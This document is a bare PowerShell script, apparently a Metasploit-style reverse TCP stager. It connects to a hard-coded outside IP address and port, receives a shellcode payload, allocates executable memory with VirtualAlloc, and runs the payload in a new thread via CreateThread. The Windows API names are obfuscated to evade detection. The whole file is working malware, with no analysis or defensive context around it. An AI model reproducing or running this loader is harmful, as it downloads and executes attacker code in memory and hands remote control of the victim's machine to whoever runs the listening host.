Set-Variable -Name ip -Value ("206.189.80.59"); Set-Variable -Name port -Value (22812); Set-Variable -Name c -Value (@"
[D#ll#Imp#ort("ker#ne#l32.#dll")] publi#c static e#xtern In#tPtr Virt#ualAl#loc(Int#Ptr w, ui#nt x, ui#nt y, ui#nt z);
[Dl#lI##mpor#t("kern#el32.d#ll")] pub#lic st#atic ex#tern Int#Ptr Cr#eate#Thr#ead(Int#Ptr u, u#int v, IntP#tr w, Int#Ptr x, ui#nt y, IntPtr z);
"@.replace("#", ""))
try{Set-Variable -Name s -Value (New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp))
$s.Connect($ip, $port) | out-null; Set-Variable -Name p -Value ([Array]::CreateInstance("byte", 4)); Set-Variable -Name x -Value ($s.Receive($p) | out-null); Set-Variable -Name z -Value (0)
Set-Variable -Name y -Value ([Array]::CreateInstance("byte", [BitConverter]::ToInt32($p,0)+5)); $y[0] = 0xBF
while ($z -lt [BitConverter]::ToInt32($p,0)) { Set-Variable -Name z -Value ($z + ($s.Receive($y,$z+5,1,[System.Net.Sockets.SocketFlags]::None))) }
for (Set-Variable -Name i -Value (1); $i -le 4; $i++) {$y[$i] = [System.BitConverter]::GetBytes([System.Int32]$s.Handle)[$i-1]}
Set-Variable -Name t -Value (Add-Type -Name "Win32" -namespace Win32Functions -memberDefinition $c -passthru); Set-Variable -Name x -Value ($t::VirtualAlloc(0,$y.Length,0x3000,0x40))
[Runtime.InteropServices.Marshal]::Copy($y, 0, [IntPtr]($x.ToInt32()), $y.Length)
$t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400;  Start-Sleep -Second 86400; Start-Sleep -Second 86400; Start-Sleep -Second 86400}catch{}
